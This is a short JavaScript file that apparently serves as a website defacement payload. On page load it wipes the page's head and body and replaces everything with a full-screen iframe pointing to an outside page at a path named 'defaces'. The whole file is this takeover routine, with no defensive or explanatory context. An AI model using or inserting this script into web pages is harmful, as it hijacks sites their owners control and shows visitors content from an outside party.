document.addEventListener("DOMContentLoaded", function () {
    // Clear the <head> and <body> content
    document.head.innerHTML = '';
    document.body.innerHTML = '';

    // Remove default margin and padding on <html> and <body>
    document.documentElement.style.margin = "0";
    document.documentElement.style.padding = "0";
    document.body.style.margin = "0";
    document.body.style.padding = "0";
    document.body.style.overflow = "hidden";

    // Create and configure the iframe
    const iframe = document.createElement("iframe");
    iframe.src = "https://frostfoe.github.io/defaces/palestine.html";
    iframe.style.border = "none";
    iframe.style.width = "100vw";
    iframe.style.height = "100vh";
    iframe.style.margin = "0";
    iframe.style.padding = "0";
    iframe.style.overflow = "hidden";
    iframe.style.position = "fixed";
    iframe.style.top = "0";
    iframe.style.left = "0";

    // Append iframe to body
    document.body.appendChild(iframe);
});
